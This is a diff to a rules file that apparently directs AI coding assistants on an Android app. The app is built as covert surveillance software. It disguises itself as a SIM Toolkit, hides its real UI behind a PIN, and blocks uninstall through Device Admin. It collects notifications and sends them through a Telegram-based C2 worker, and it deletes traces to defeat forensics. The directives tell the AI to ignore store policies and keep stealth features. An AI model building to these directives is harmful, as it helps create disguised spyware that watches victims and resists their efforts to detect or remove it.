@@ -15,12 +15,12 @@ This document defines the context, rules, and architectural constraints for AI a
 *   **Database**: Room (SQLite) with Write-Ahead Logging (WAL).
 *   **Networking**: OkHttp (Bot API Client, GitHub Updater).
 *   **Scheduling**: WorkManager (Periodic 15-min cycles).
-*   **Stealth**: `PackageManager` manipulation (Icon logic) + `SecureDelete` (Forensics).
-*   **Security**: App Lock (Encrypted Password) & Input Masking.
+*   **Stealth**: **Decoy UI** (`SIMMenuActivity`) + `SecureDelete` (Forensics).
+*   **Security**: App Lock (Encrypted Password) & **Device Admin** (Uninstall Protection).
 
 ## Critical Constraints (Directives)
 1.  **No Google Play Compliance**: We deliberately violate Play Store policies regarding `AccessibilityService` and `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`. Do **NOT** suggest removing features to comply with store rules.
-2.  **Stealth First**: Any UI element added must have a purpose for the *setup phase* only. After setup, the app must be invisible (Headless).
+2.  **Stealth First**: The app must appear harmless (e.g., SIM Toolkit). Any real UI elements must be hidden behind secret triggers (e.g., PIN).
 3.  **Persistence is Paramount**: The app must survive aggressive OS memory killing. Use `WorkManager` (Periodic) as the primary heartbeat.
 4.  **Zero-Knowledge**: Never transmit plaintext logs if avoidable. (Phase 4 currently relies on HTTPS transport security). always verify secure deletion.
 
@@ -39,9 +39,9 @@ This document defines the context, rules, and architectural constraints for AI a
 app/src/main/
 ├── java/com/zero/sentinel/
 │   ├── workers/       # C2Worker (Polling, Uploads) - Replaces FGS
-│   ├── receivers/     # BootReceiver
+│   ├── receivers/     # BootReceiver, SentinelDeviceAdminReceiver
 │   ├── telemetry/     # SentinelNotificationListener (Data Source)
-│   ├── ui/            # MainActivity (Config)
+│   ├── ui/            # MainActivity (Admin), SIMMenuActivity (Decoy)
 │   ├── data/          # Room DB, Repository, EncryptedPrefsManager
 │   ├── utils/         # StealthManager, SecureDelete
 │   └── network/       # TelegramClient, CommandProcessor, GithubUpdater
